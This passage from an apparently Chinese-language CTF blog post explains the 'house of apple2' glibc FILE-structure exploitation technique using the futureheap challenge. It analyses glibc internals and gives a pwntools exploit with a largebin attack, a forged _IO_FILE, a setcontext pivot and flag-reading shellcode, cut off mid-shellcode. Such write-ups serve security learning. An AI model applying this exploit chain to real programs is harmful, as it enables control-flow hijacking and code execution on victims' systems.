<li>劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code></li>
<li>控制<code>_wide_data</code>为可控的堆地址空间</li>
<li>控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间</li>
<li>控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流</li>
</ol>
<p>总体来说还是利用FSOP，最后<code>_IO_flush_all_lockp</code>中触发调用<code>_IO_OVERFLOW (fp, EOF)</code>这个虚表函数，因为到了高版本glibc，所以不能直接改虚表，需要借助到其他相似结构的其他虚表。</p>
<p>大致有三条链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br><span class="line"></span><br><span class="line">_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br><span class="line"></span><br><span class="line">_IO_wdefault_xsgetn -&gt; __wunderflow -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</span><br></pre></td></tr></table></figure></div>
<h4 id="利用细节">利用细节</h4>
<p>这里以源鲁杯的futureheap这道题对这种利用方式进行学习。</p>
<h5 id="结构体">结构体</h5>
<p>先熟悉一下几个结构体的具体字段。</p>
<h6 id="io_file">_IO_FILE</h6>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109154309187.png"
                      class=""
                >
<h6 id="io_wfile_jumps">_IO_wfile_jumps</h6>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109113127595.png"
                      class=""
                >
<h6 id="io_file_jumps">_IO_file_jumps</h6>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241110004510956.png"
                      class=""
                >
<h6 id="io_wide_data">_IO_wide_data</h6>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109232015744.png"
                      class=""
                >
<blockquote>
<p>在glibc2.24以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性。</p>
<p>其检查流程为：计算_IO_vtable
段的长度（section_length），用当前虚表指针的地址减去_IO_vtable
段的开始地址，如果vtable相对于开始地址的偏移大于等于section_length，那么就会进入_IO_vtable_check进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入_IO_vtable_check函数后会触发abort。</p>
<p>虽然对vtable的检查较为严格，但是对于具体位置和具体偏移的检测则是较为宽松的，可以修改vtable指针为虚表段内的任意位置，也就是对于某一个**_IO_xxx_jumps**的任意偏移，使得其调用攻击者想要调用的IO函数。</p>
</blockquote>
<p>我们的思路就是借鉴FSOP，用_wide_data这个成员结构体中的_wide_vtable，同样是宏调用，但没有进一步的检测。</p>
<h5 id="io_wfile_overflow链">1._IO_wfile_overflow链</h5>
<p>源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_wdoallocbuf (f);</span><br><span class="line">	  _IO_free_wbackup_area (f);</span><br><span class="line">	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_doallocbuf (f);</span><br><span class="line">	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">          ......</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">		     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">      </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">				       + offsetof(TYPE, MEMBER)))</span></span><br></pre></td></tr></table></figure></div>
<p>首先最终的目标是<code>_IO_wdoallocbuf</code>中的<code>(wint_t)_IO_WDOALLOCATE (fp)</code>的调用，追踪几个宏定义会发现，最终执行了<code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code>这样一个函数。这里的_wide_vtable实际上就是一个虚表，其0x68偏移处就是<code>__doallocate</code>这一项。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109155032548.png"
                      class=""
                >
<p>那么我们反向追溯一下，发现需要让如下的条件成立以绕过条件判断：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base==<span class="number">0</span>;</span><br><span class="line">!(fp-&gt;_flags &amp; _IO_UNBUFFERED)!=<span class="number">0</span>;	<span class="comment">//(fp-&gt;_flags &amp; 0x2)==0;</span></span><br><span class="line">f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>;</span><br><span class="line">f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == <span class="number">0</span>;		<span class="comment">//f-&gt;_flags &amp; 0x800 == 0;</span></span><br><span class="line">f-&gt;_flags &amp; _IO_NO_WRITES==<span class="number">0</span>;		<span class="comment">//f-&gt;_flags &amp; 0x8==0;</span></span><br></pre></td></tr></table></figure></div>
<p>伪造的_IO_FILE对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code>，因为_IO_FILE的0xa0偏移处是_wide_data域。</li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<p>由于触发FSOP的<code>_IO_flush_all_lockp</code>函数中有这么一条判断，所以我们要使前两个条件有一个为真，也就是<code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>
或
<code>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code>，第一个条件比较好满足。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是，最后是<code>call qword ptr [rax + 0x68]</code>实现跳转，所以在rax+0x68的位置不能直接是shellcode，而是一个合法的地址。在这里报错时就可以观察寄存器信息，这里rdx实质就指向我们之前伪造的fake_IO_FILE的_wide_data域。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109200034550.png"
                      class=""
                >
<p>这里setcontext能够把rdx作为一个类sigFrame的指针，然后恢复各字段。然后就能够进行各种操作了，比如进行srop等等。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109200645735.png"
                      class=""
                >
<p>现在我们来分析一下futureheap这道题</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109221708861.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109225750797.png"
                      class=""
                >
<p>首先这个init函数中是经典的伪随机数的利用，可以最终得到libc_base和一个fortune的地址，这个fortune是一个rwx的段，可以写shellcode然后想办法执行。这道题也刚好沙箱禁用了直接的execve调用和一些基本的orw函数。但是我们只要能劫持程序执行流，还是能比较方便的利用系统调用读取flag。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230302958.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230106028.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230119254.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230135976.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109230148959.png"
                      class=""
                >
<p>还是比较经典的菜单题，主要功能有add，delete和edit。其中delete存在UAF，add只能申请largebin
chunk。edit有3次机会，之后会直接调用exit退出。然后还存在一个函数，只要输对密码就能往fortune中写入0x500字节。这个密码的获取是一个简单的换表base64。</p>
<p>那么我们就可以开始学习house of apple2的利用了，首先就是用largebin
attack来把_IO_list_all改成我们一个largebin
chunk的地址，然后再在该largebin chunk中伪造IO_FILE结构体。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x528</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x518</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x550</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">log.success(<span class="string">&quot;_io_list_all:&quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(_IO_list_all-<span class="number">0x20</span>))</span><br></pre></td></tr></table></figure></div>
<p>一开始的largebin
attack过程就不过多赘述了，先留一个chunk在largebin里，改掉其bk_nextsize域为<code>tar-0x20</code>，然后再让一个较小的chunk进入到largebin时，就能触发glibc2.31版本以上的改单一地址的largebin
attack。到这里我们的_IO_list_all被成功改写成largebin chunk的地址。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109231242168.png"
                      class=""
                >
<p>然后最关键的就是这个<code>_IO_FILE</code>结构体的构造,由于我们是从数据域开始写，所以一开始的<code>_flags</code>和<code>_IO_read_ptr</code>是无法通过edit控制的。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_IO_FILE  = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) <span class="comment">#_write_base,_write_ptr</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(<span class="number">0</span>) <span class="comment">#_IO_buf_base,_IO_buf_end </span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      <span class="comment">#_IO_save_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      <span class="comment">#_IO_backup_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)       <span class="comment">#_lock</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x18</span>)    <span class="comment">#_wide_data</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)            <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)       <span class="comment">#setcontext-&gt;rsp</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)     <span class="comment">#setcontext-&gt;rcx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="comment"># vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x100</span>-<span class="number">0x68</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) + shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;74r0t#C@rd&quot;</span></span><br><span class="line">out()</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.sendline(fake_IO_FILE)</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109231530476.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109233732611.png"
                      class=""
                >
<p>首先将<code>write_base</code>和<code>write_ptr</code>这两个字段分别置1和2，并且把mode置0是为了满足<code>_IO_flush_all_lockp</code>中一个条件，原理见上文。之后要把vtable指向<code>_IO_wfile_jumps</code>，这是因为虽然在glibc2.24及以上多了一个对虚表地址的检测，使其不能偏离所在段太远，但是我们还是可以利用附近的别的虚表进行利用。这里我们选择触发的是<code>_IO_wfile_jumps</code>的<code>_IO_wfile_overflow</code>。也就是<code>_IO_flush_all_lockp</code>中的<code>_IO_OVERFLOW (fp, EOF)</code>这个。因为多态的设计，虚表的结构都是一样的，所以我们本来是调用正常的overflow虚表函数，这里我们劫持到<code>_IO_wfile_jumps</code>后，我们调用的就是<code>__GI__IO_wfile_overflow</code>。然后其具体函数实现里给了我们可趁之机。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109232222317.png"
                      class=""
                >
<p>然后就能进入<code>_IO_wfile_overflow</code>中。这里我们_flags字段为0，是能够满足里面的各种条件的。然后最关键的就是伪造的<code>IO_FILE</code>的<code>_wide_data</code>这个字段的赋值，因为我们没有堆的基址，但有一个fortune的地址，所以我们可以把伪造的<code>_wide_data</code>这个结构体放到fortune这个位置处，为了方便我们可以复用原来的伪造到堆上的IO_FILE结构，但是因为要使<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code>，所以我们进行一定的错位，这里我选择的是把<code>_wide_data</code>弄到<code>fortune+0x18</code>，这个位置去。然后就能满足下面这两个条件</p>
<blockquote>
<ul>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
</ul>
</blockquote>
<p>之后来看后面的构造，我们要找到一个B的位置，然后控制<code>*(B + 0x68)</code>，这样就能把我们的RIP劫持到目标地址处去了</p>
<blockquote>
<ul>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
</blockquote>
<p>也就是如下面这3部分的构造。由于我们最后是call到C这里，所以不能直接执行shellcode。我们可以通过setcontext来将rsp放到目标位置，然后setcontext中间会push一个rcx，所以我们可以连带着rcx设置为目标shellcode位置，最后ret到rcx指向的地址，也就执行了我们事先布置的shellcode了。这里rdx就是我们之前布置的<code>_wide_data</code>的位置，然后我们在不影响原来_IO_FILE利用时，设置对应偏移字段来达成特定寄存器的赋值。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x100</span>-<span class="number">0x68</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) + shellcode</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109235637786.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109235847848.png"
                      class=""
                >
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">table = <span class="string">&quot;polikujmyhntgbrfvedcwsxqazQWERTYUIOPASDFGHJKLZXCVBNM)!@#$%^&amp;*(+/&quot;</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">glibc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">name = <span class="string">b&quot;a&quot;</span>*<span class="number">8</span> + p32(<span class="number">0x88888888</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;dear:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">0x88888888</span>)</span><br><span class="line">wolf = libc.rand()</span><br><span class="line">sword = libc.rand()</span><br><span class="line">log.success(<span class="string">&quot;wolf:&quot;</span>+<span class="built_in">str</span>(wolf)+<span class="string">&quot;  sword:&quot;</span>+<span class="built_in">str</span>(sword))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Lion is &quot;</span>)</span><br><span class="line">lion = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;Lion:&quot;</span>+<span class="built_in">str</span>(lion))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Snake is &quot;</span>)</span><br><span class="line">snake = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;snake:&quot;</span>+<span class="built_in">str</span>(snake))</span><br><span class="line"></span><br><span class="line">setvbuf_add = lion ^ wolf ^ libc.rand()</span><br><span class="line">libc_base = setvbuf_add - glibc.sym[<span class="string">&quot;setvbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">v0 = snake ^ libc.rand()</span><br><span class="line">fortune = v0 ^ sword</span><br><span class="line">log.success(<span class="string">&quot;fortune:&quot;</span>+<span class="built_in">hex</span>(fortune))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>=libc_base+glibc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + glibc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + glibc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">stderr=libc_base+glibc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">_IO_list_all=libc_base+glibc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">setcontext=libc_base + glibc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps =libc_base+glibc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>():</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x528</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x518</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x550</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">log.success(<span class="string">&quot;_io_list_all:&quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(_IO_list_all-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">sub rdi,100</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">mov rdx,rsp</span></span><br><span class="line"><span class="string">mov rsi, 0x67616c662f</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">add rdx,0x100</span></span><br><span class="line"><span class="string">mov r10,0x18</span></span><br><span class="line"><span class="string">mov rax,0x1b5</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 3</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">mov rdx, 